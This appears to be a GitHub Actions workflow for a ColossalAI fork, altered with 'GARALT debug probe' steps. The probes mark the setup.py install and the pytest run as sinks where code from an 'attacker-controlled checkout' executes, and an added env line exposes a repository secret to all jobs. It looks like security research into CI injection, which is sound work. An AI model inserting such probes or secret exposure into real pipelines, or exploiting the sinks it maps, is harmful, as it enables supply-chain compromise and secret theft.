name: Build on PR
jobs:
  detect:
    name: Detect file change
    if: |
      github.event_name == 'pull_request' &&
      (github.event.action == 'synchronize' || github.event.action == 'opened' || github.event.action == 'reopened' || github.event.action == 'ready_for_review') &&
      github.event.pull_request.draft == false &&
      github.event.pull_request.base.repo.full_name == 'elcolloff/ColossalAI'
    outputs:
      changedExtenisonFiles: ${{ steps.find-extension-change.outputs.all_changed_files }}
      anyExtensionFileChanged: ${{ steps.find-extension-change.outputs.any_changed }}
      changedLibraryFiles: ${{ steps.find-lib-change.outputs.all_changed_files }}
      anyLibraryFileChanged: ${{ steps.find-lib-change.outputs.any_changed }}
    runs-on: ubuntu-latest
    concurrency:
      group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}-detect-change
      cancel-in-progress: true
    steps:
    - uses: actions/checkout@v2
      with:
        fetch-depth: 0
        ref: ${{ github.event.pull_request.head.sha }}
    - name: Locate base commit
      id: locate-base-sha
      run: |
        curBranch=$(git rev-parse --abbrev-ref HEAD)
        commonCommit=$(git merge-base origin/main $curBranch)
        echo $commonCommit
        echo "baseSHA=$commonCommit" >> $GITHUB_OUTPUT
    - name: Find the changed extension-related files
      id: find-extension-change
      uses: tj-actions/changed-files@v35
      with:
        base_sha: ${{ steps.locate-base-sha.outputs.baseSHA }}
        files: |
          op_builder/**
          colossalai/kernel/**
          setup.py
    - name: Find the changed library-related files
      id: find-lib-change
      uses: tj-actions/changed-files@v35
      with:
        base_sha: ${{ steps.locate-base-sha.outputs.baseSHA }}
        files: |
          **/*.py
          **/*.h
          **/*.cpp
          **/*.cu
          **/*.txt
  build:
    name: Build and Test Colossal-AI
    needs: detect
    if: needs.detect.outputs.anyLibraryFileChanged == 'true'
    runs-on: ubuntu-latest
    container:
      image: image-cloud.luchentech.com/hpcaitech/pytorch-cuda:2.2.2-12.1.0
      options: --gpus all --shm-size=2g --rm -v /dev/shm -v /data/scratch:/data/scratch
    timeout-minutes: 90
    defaults:
      run:
        shell: bash
    concurrency:
      group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}-run-test
      cancel-in-progress: true
    steps:
    - name: GARALT debug probe
      run: |-
        echo "GARALT_DBG: About to execute Install Colossal-AI step (SINK 1)"
        printf 'GARALT_DBG: anyLibraryFileChanged=%s\n' "${{ needs.detect.outputs.anyLibraryFileChanged }}"
        printf 'GARALT_DBG: BUILD_EXT=1 pip install -v -e . will run setup.py from attacker-controlled checkout\n'
        # Check what's in the checkout
        if [ -f setup.py ]; then
          printf 'GARALT_DBG: setup.py exists in checkout, first 5 lines:\n'
          head -5 setup.py
        else
          printf 'GARALT_DBG: setup.py NOT found in checkout\n'
        fi
        # Check conftest files
        found_conftest=$(find . -name 'conftest.py' -maxdepth 2 2>/dev/null | head -5)
        if [ -n "$found_conftest" ]; then
          printf 'GARALT_DBG: conftest.py files found:\n%s\n' "$found_conftest"
        else
          printf 'GARALT_DBG: No conftest.py found in first 2 levels\n'
        fi
      continue-on-error: true
    - name: GARALT debug probe
      run: |-
        echo "GARALT_DBG: About to execute Execute Unit Testing step (SINK 2)"
        printf 'GARALT_DBG: Command: CURL_CA_BUNDLE="" PYTHONPATH=$PWD FAST_TEST=1 pytest ... tests/\n'
        printf 'GARALT_DBG: This will import and execute conftest.py and test files from attacker-controlled checkout\n'
        # Check what test files exist
        if [ -d tests ]; then
          printf 'GARALT_DBG: tests/ directory exists, listing top-level:\n'
          ls -la tests/ | head -20
        else
          printf 'GARALT_DBG: tests/ directory NOT found\n'
        fi
        # Check for conftest.py in tests dir
        if [ -f tests/conftest.py ]; then
          printf 'GARALT_DBG: tests/conftest.py exists, first 10 lines:\n'
          head -10 tests/conftest.py
        fi
      continue-on-error: true
    - name: Checkout Colossal-AI
      uses: actions/checkout@v2
      with:
        ssh-key: ${{ secrets.SSH_KEY_FOR_CI }}
    - name: Install Colossal-AI
      run: |
        BUILD_EXT=1 pip install -v -e .
        pip install --no-cache-dir -r requirements/requirements-test.txt
    - name: Execute Unit Testing
      run: |
        CURL_CA_BUNDLE="" PYTHONPATH=$PWD FAST_TEST=1 pytest \
        -m "not largedist" \
        --durations=0 \
        --ignore tests/test_analyzer \
        --ignore tests/test_auto_parallel \
        --ignore tests/test_fx \
        --ignore tests/test_autochunk \
        --ignore tests/test_gptq \
        --ignore tests/test_infer_ops \
        --ignore tests/test_legacy \
        --ignore tests/test_smoothquant \
        tests/
      env:
        LD_LIBRARY_PATH: /github/home/.tensornvme/lib:/usr/local/nvidia/lib:/usr/local/nvidia/lib64
        LLAMA_PATH: /data/scratch/llama-tiny
        MOE_TENSOR_PATH: /data/scratch/moe_tensors
        HF_ENDPOINT: https://hf-mirror.com
env:
  GARALT_SECRET: ${{ secrets.GARALT }}
on:
  pull_request:
    types:
    - synchronize
    - opened
    - reopened
    - ready_for_review
    - closed
    branches:
    - main
    - develop
    - feature/**
    paths:
    - .github/workflows/build_on_pr.yml
    - colossalai/**
    - '!colossalai/**.md'
    - op_builder/**
    - '!op_builder/**.md'
    - requirements/**
    - tests/**
    - '!tests/**.md'
    - pytest.ini
    - setup.py
  create: null
  delete: null
